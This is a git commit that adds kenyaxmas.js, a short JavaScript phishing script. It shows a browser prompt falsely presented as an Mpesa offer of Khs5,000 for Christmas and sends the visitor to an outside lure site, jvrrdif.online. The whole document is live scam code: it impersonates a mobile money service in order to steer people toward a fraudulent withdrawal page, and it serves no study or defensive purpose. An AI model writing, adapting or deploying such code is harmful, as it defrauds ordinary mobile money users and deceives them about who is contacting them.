da1994f6c66f7529859bf0f31f3bdb817f58a88b
newetijazz7 <newetijazz7@gmail.com>
2025-12-09 19:55:56 +0100

    Create kenyaxmas.js

---
+++ kenyaxmas.js
@@ -0,0 +1,5 @@
+var password = 'Withdraw Khs5,000'
+password=prompt('Mpesa: We are offering khs5,000 to all our customers to celebrate this year Christmas, press OK to Get offer now','Withdraw Khs5,000');
+if (password != 'Withdraw Khs5,000') {
+location.href='https://www.jvrrdif.online/Withdraw-Mpesa-Ksh5000';
+}
